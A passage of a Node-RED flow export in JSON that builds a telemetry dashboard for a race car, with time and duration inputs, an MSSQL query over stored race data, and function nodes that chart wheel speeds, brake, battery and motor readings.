        "label": "Starting Time",
        "tooltip": "",
        "group": "138120695bcd6cbc",
        "order": 4,
        "width": 0,
        "height": 0,
        "passthru": true,
        "mode": "datetime-local",
        "delay": 300,
        "topic": "starting_time",
        "sendOnBlur": true,
        "className": "",
        "topicType": "str",
        "x": 140,
        "y": 120,
        "wires": [
            [
                "241e5be9fe6915e5",
                "0f64fb62f2acf3f9"
            ]
        ]
    },
    {
        "id": "59182ad2fc64eb19",
        "type": "ui_slider",
        "z": "eb28fbcf28e5aae9",
        "name": "",
        "label": "Duration (Minutes)",
        "tooltip": "",
        "group": "138120695bcd6cbc",
        "order": 4,
        "width": 0,
        "height": 0,
        "passthru": true,
        "outs": "all",
        "topic": "duration",
        "topicType": "str",
        "min": 0,
        "max": "30",
        "step": 1,
        "className": "",
        "x": 150,
        "y": 160,
        "wires": [
            [
                "241e5be9fe6915e5",
                "d29c9b07593fc9cb"
            ]
        ]
    },
    {
        "id": "241e5be9fe6915e5",
        "type": "join",
        "z": "eb28fbcf28e5aae9",
        "name": "",
        "mode": "custom",
        "build": "object",
        "property": "payload",
        "propertyType": "msg",
        "key": "topic",
        "joiner": "\\n",
        "joinerType": "str",
        "accumulate": true,
        "timeout": "",
        "count": "2",
        "reduceRight": false,
        "reduceExp": "",
        "reduceInit": "",
        "reduceInitType": "",
        "reduceFixup": "",
        "x": 330,
        "y": 140,
        "wires": [
            [
                "759ee1b25d57a0f8",
                "1a24d7f3601e2f02"
            ]
        ]
    },
    {
        "id": "0f64fb62f2acf3f9",
        "type": "ui_text",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 4,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Start",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 270,
        "y": 60,
        "wires": []
    },
    {
        "id": "d29c9b07593fc9cb",
        "type": "ui_text",
        "z": "eb28fbcf28e5aae9",
        "group": "138120695bcd6cbc",
        "order": 5,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Duration",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 300,
        "y": 220,
        "wires": []
    },
    {
        "id": "1a24d7f3601e2f02",
        "type": "ui_text",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 5,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Func Input",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 490,
        "y": 180,
        "wires": []
    },
    {
        "id": "781e968617198999",
        "type": "ui_text",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 4,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "SQL Query Results",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 1010,
        "y": 140,
        "wires": []
    },
    {
        "id": "5ea20cae93e67743",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.wheel_speed_front_left);\nlet series2 = msg.payload.map(item => item.wheel_speed_front_right);\nlet series3 = msg.payload.map(item => item.wheel_speed_rear_left);\nlet series4 = msg.payload.map(item => item.wheel_speed_rear_right);\n\nmsg.payload = [\n    {\n        \"series\": [\"Wheel Speed Front Left\", \"Wheel Speed Front Right\", \"Wheel Speed Rear Left\", \"Wheel Speed Rear Right\"],\n        \"data\": [series1, series2, series3, series4],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 180,
        "wires": [
            [
                "dbc2965cad1ea5d1"
            ]
        ]
    },
    {
        "id": "dbc2965cad1ea5d1",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Wheel Speeds",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1260,
        "y": 180,
        "wires": [
            []
        ]
    },
    {
        "id": "067ea4b861a76345",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.brake_pressure_front);\nlet series2 = msg.payload.map(item => item.brake_pressure_rear);\n\nmsg.payload = [\n    {\n        \"series\": [\"Front Brake Pressure\", \"Rear Brake Pressure\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 220,
        "wires": [
            [
                "be171d6b0c5a7e27"
            ]
        ]
    },
    {
        "id": "be171d6b0c5a7e27",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Brake Pressures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1260,
        "y": 220,
        "wires": [
            []
        ]
    },
    {
        "id": "ddb3793baa665a2b",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.steering_angle);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Steering Angle\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 260,
        "wires": [
            [
                "d95d5b4990bca00c"
            ]
        ]
    },
    {
        "id": "d95d5b4990bca00c",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Steering Angle",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1260,
        "y": 260,
        "wires": [
            []
        ]
    },
    {
        "id": "2450c410b4c90958",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.vehicle_speed);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Vehicle Speed\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 300,
        "wires": [
            [
                "461cd5cc376a0a6d"
            ]
        ]
    },
    {
        "id": "461cd5cc376a0a6d",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Vehicle Speed",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1260,
        "y": 300,
        "wires": [
            []
        ]
    },
    {
        "id": "648b3a05a867bfb6",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.high_temp);\nlet series2 = msg.payload.map(item => item.low_temp);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"High temperatures\", \"Low temperatures\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 340,
        "wires": [
            [
                "b2171eb5ca062c37"
            ]
        ]
    },
    {
        "id": "b2171eb5ca062c37",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "High/Low Battery Temperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1310,
        "y": 340,
        "wires": [
            []
        ]
    },
    {
        "id": "dc1ae1aafb033480",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.pack_open_voltage);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Pack Open Voltage\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 380,
        "wires": [
            [
                "5b1f70bb8ff8d693"
            ]
        ]
    },
    {
        "id": "5b1f70bb8ff8d693",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Pack Open Voltage",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1270,
        "y": 380,
        "wires": [
            []
        ]
    },
    {
        "id": "cca48cef66a2c49d",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.pack_amp_hours);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Pack Amp Hours\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 420,
        "wires": [
            [
                "6218abde45054d3d"
            ]
        ]
    },
    {
        "id": "6218abde45054d3d",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Pack Amp Hours",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1270,
        "y": 420,
        "wires": [
            []
        ]
    },
    {
        "id": "9aa6592d1262b5b2",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_motor_speed);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Motor Speed\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 460,
        "wires": [
            [
                "caa1d8c0e02b5464"
            ]
        ]
    },
    {
        "id": "caa1d8c0e02b5464",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Motor Speed",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1250,
        "y": 460,
        "wires": [
            []
        ]
    },
    {
        "id": "60fd3fd1490c62d5",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_motor_temperature);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Motor Temperature\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 500,
        "wires": [
            [
                "539dccea29e2df46"
            ]
        ]
    },
    {
        "id": "539dccea29e2df46",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Motor Temperature",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1270,
        "y": 500,
        "wires": [
            []
        ]
    },
    {
        "id": "08d1eddcb59d0d2b",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.brake_temperature_front_left);\nlet series2 = msg.payload.map(item => item.brake_temperature_front_right);\nlet series3 = msg.payload.map(item => item.brake_temperature_rear_left);\nlet series4 = msg.payload.map(item => item.brake_temperature_rear_right);\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Brake Temp Front Left\", \"Brake Temperature Front Right\", \"Brake Temperature Rear Left\", \"Brake Temperature Rear Right\"],\n        \"data\": [series1, series2, series3, series4],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 540,
        "wires": [
            [
                "167ba8a33f858ed6"
            ]
        ]
    },
    {
        "id": "167ba8a33f858ed6",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Brake Temperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1280,
        "y": 540,
        "wires": [
            []
        ]
    },
    {
        "id": "846b2dcf25742263",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_torque_feedback);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Torque Feedback\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 580,
        "wires": [
            [
                "03f5af36309c76ea"
            ]
        ]
    },
    {
        "id": "c38968523ba4a727",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_commanded_torque);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Commanded Torque\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 620,
        "wires": [
            [
                "a495d3909dedb2c3"
            ]
        ]
    },
    {
        "id": "03f5af36309c76ea",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Torque Feedback",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1270,
        "y": 580,
        "wires": [
            []
        ]
    },
    {
        "id": "a495d3909dedb2c3",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Commanded Torque",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1280,
        "y": 620,
        "wires": [
            []
        ]
    },
    {
        "id": "b1f884da881c8fc2",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.wheel_speed_front_left);\nlet series2 = msg.payload.map(item => item.wheel_speed_front_right);\nlet series3 = msg.payload.map(item => item.wheel_speed_rear_left);\nlet series4 = msg.payload.map(item => item.wheel_speed_rear_right);\nlet series5 = msg.payload.map(item => item.brake_pressure_front);\nlet series6 = msg.payload.map(item => item.brake_pressure_rear);\nlet series7 = msg.payload.map(item => item.steering_angle);\nlet series8 = msg.payload.map(item => item.vehicle_speed);\nlet series9 = msg.payload.map(item => item.high_temp);\nlet series10 = msg.payload.map(item => item.low_temp);\nlet series11 = msg.payload.map(item => item.pack_open_voltage);\nlet series12 = msg.payload.map(item => item.pack_amp_hours);\nlet series13 = msg.payload.map(item => item.inv_motor_speed);\nlet series14 = msg.payload.map(item => item.inv_motor_temperature);\nlet series15 = msg.payload.map(item => item.brake_temperature_front_left);\nlet series16 = msg.payload.map(item => item.brake_temperature_front_right);\nlet series17 = msg.payload.map(item => item.brake_temperature_rear_left);\nlet series18 = msg.payload.map(item => item.brake_temperature_rear_right);\nlet series19 = msg.payload.map(item => item.inv_torque_feedback);\nlet series20 = msg.payload.map(item => item.inv_commanded_torque);\n\nmsg.payload = [\n    {\n        \"series\": [\"Wheel Speed Front Left\", \"Wheel Speed Front Right\", \"Wheel Speed Rear Left\", \"Wheel Speed Rear Right\", \"Brake Pressure Front\", \"Brake Pressure Rear\", \"Steering Angle\", \"Vehicle Speed\", \"High Temperature\", \"Low Temperature\", \"Pack Open Voltage\", \"Pack Amphours\", \"Motor Speed\", \"Motor Temperature\", \"Brake Temperature Front Left\", \"Brake Temperature Front Right\", \"Brake Temperature Rear Left\", \"Brake Temperature Rear Right\", \"Torque Feedback\", \"Commanded Torque\"],\n        \"data\": [series1, series2, series3, series4, series5, series6, series7, series8, series9, series10, series11, series12, series13, series14, series15, series16, series17, series18, series19, series20],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 680,
        "wires": [
            [
                "eaaff7d74f7a7e52"
            ]
        ]
    },
    {
        "id": "eaaff7d74f7a7e52",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "name": "",
        "group": "138120695bcd6cbc",
        "order": 7,
        "width": "30",
        "height": "14",
        "label": "All Vars",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1240,
        "y": 680,
        "wires": [
            []
        ]
    },
    {
        "id": "90f0eb2c4e1b1de5",
        "type": "MSSQL",
        "z": "a5a35a884df38a1a",
        "mssqlCN": "933ce03686fddbab",
        "name": "Past Data",
        "outField": "payload",
        "returnType": 0,
        "throwErrors": 1,
        "query": "SELECT *\nFROM dbo.race_data\nWHERE timestamp BETWEEN '{{payload.start_time}}' AND '{{payload.end_time}}'\nORDER BY timestamp",
        "modeOpt": "queryMode",
        "modeOptType": "query",
        "queryOpt": "payload",
        "queryOptType": "editor",
        "paramsOpt": "payload.selectedDateTime",
        "paramsOptType": "msg",
        "rows": "rows",
        "rowsType": "msg",
        "parseMustache": true,
        "params": [],
        "x": 740,
        "y": 220,
        "wires": [
            [
                "3f77ee8a1510677f",
                "354b6bbdf930116d",
                "c1dbb1ec98c57aba",
                "5d12423eb237299d",
                "5e1e1ac619816c05",
                "7346961e9bc86d1b",
                "629f06c4e2507c71",
                "d3b3112a27dec1a5",
                "51528fa94f8bc774",
                "639f7b8a0640fe69",
                "150676ae27de9713",
                "d0954a33c4746f3c",
                "259fc783c92c7936",
                "b5b24d160b2a085e",
                "3118857487301cfe",
                "7f504d5c515686cb",
                "6ac0390839e64a7c",
                "a57cf2d67b576307",
                "6ee6fbe0faa559f8"
            ]
        ]
    },
    {
        "id": "107e61d82c73e1c1",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Convert Date & Time",
        "func": "// Extract date and time components from the incoming message\nvar start_time = msg.payload.starting_time; // Assuming date is provided by ui_date node\nvar duration = msg.payload.duration; // Assuming time is provided by ui_time node\n\nstart_time = start_time / 1000;     //Convert from milliseconds to seconds\nstart_time = start_time + 5*60*60;  //Convert to EST by adding 5 hours \n\nduration = duration * 60;    //Convert duration from minutes to seconds\n\nmsg.payload =\n{\n    start_time: start_time,\n    end_time : start_time + duration\n}\n\n// Pass the modified message to the next node in the flow\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 560,
        "y": 220,
        "wires": [
            [
                "9f940de87cced2c6",
                "90f0eb2c4e1b1de5"
            ]
        ]
    },
    {
        "id": "9f940de87cced2c6",
        "type": "ui_text",
        "z": "a5a35a884df38a1a",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 3,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "payload",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 660,
        "y": 120,
        "wires": []
    },
    {
        "id": "8dea4ad7a9fb0cd5",
        "type": "ui_text_input",
        "z": "a5a35a884df38a1a",
        "name": "",
        "label": "Starting Time",
        "tooltip": "",
        "group": "37fa01b38570666f",
        "order": 1,
        "width": 0,
        "height": 0,
        "passthru": true,
        "mode": "datetime-local",
        "delay": 300,
